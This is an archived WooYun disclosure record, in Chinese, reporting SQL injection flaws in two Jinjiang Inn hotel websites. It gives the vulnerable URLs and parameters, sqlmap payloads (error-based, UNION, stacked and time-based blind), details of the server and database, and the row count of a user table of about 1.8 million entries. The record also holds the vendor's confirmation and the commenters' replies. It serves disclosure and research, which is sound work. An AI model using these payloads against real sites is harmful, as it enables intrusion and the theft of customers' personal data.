{"id": 4826, "wybug_id": "wooyun-2014-052407", "wybug_title": "锦江之星旗下快捷酒店SQL注射合集", "wybug_corp": "锦江之星旅馆有限公司", "wybug_author": "HackBraid", "wybug_date": "2014-03-01 09:42", "wybug_open_date": "2014-04-15 09:43", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-15：\t细节向公众公开  简要描述： SQL 详细说明：  百时快捷酒店：url:参数unitId和cityId均未过滤http://www.bestay.com.cn/Web/Chain/HotelComment.aspx?unitId=8097&cityId=锦江白玉兰：http://www.magnotel.com/Inn/chains.aspx?&UnitID=088   漏洞证明：  百时快捷酒店：\nPlace: GETParameter: unitId    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: unitId=8097' AND 2337=CONVERT(INT,(SELECT CHAR(113)+CHAR(115)+CHAR(107)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (2337=2337) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(114)+CHAR(111)+CHAR(104)+CHAR(113))) AND 'HExk'='HExk&cityId=    Type: UNION query    Title: Generic UNION query (NULL) - 9 columns    Payload: unitId=8097' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(115)+CHAR(107)+CHAR(122)+CHAR(113)+CHAR(98)+CHAR(106)+CHAR(87)+CHAR(108)+CHAR(101)+CHAR(113)+CHAR(73)+CHAR(102)+CHAR(82)+CHAR(120)+CHAR(113)+CHAR(114)+CHAR(111)+CHAR(104)+CHAR(113),NULL,NULL,NULL-- &cityId=    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: unitId=8097'; WAITFOR DELAY '0:0:5'--&cityId=    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: unitId=8097' WAITFOR DELAY '0:0:5'--&cityId=---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008available databases [5]:[*] JJWEB[*] master[*] model[*] msdb[*] tempdb\n锦200W用户信息：\nDatabase: JJWEB+--------------------+---------+| Table              | Entries |+--------------------+---------+| dbo.JW_UserMsgSite | 1832708 |+--------------------+---------+\n锦江白玉兰：\nPlace: GETParameter: UnitID    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: &UnitID=088'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: &UnitID=088' WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008\n   修复方案：  过滤，修复   版权声明：转载请注明来源 HackBraid@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-03-06 10:23 厂商回复： 已确认，正在修复，谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-01 09:43 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @niliu 没重复    \n     2014-03-01 10:30 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  洞主在他们连锁旅店住宿把 呵呵 貌似他们的技术人员会很记恨我们骇客们也仇视我们    \n     2014-03-01 14:41 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @abaddon @锦江之星旅馆有限公司 就只计算了个数值，从不脱库    \n     2014-03-01 19:19 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  @HackBraid 还真多    \n     2014-03-01 19:30 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @niliu 嗯，^^    \n     2014-03-04 21:18 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  @HackBraid 那就好 ABD的的行踪被楼主监控 会感觉很不好的  真厚道楼主    \n     2014-03-04 21:24 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @abaddon ？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}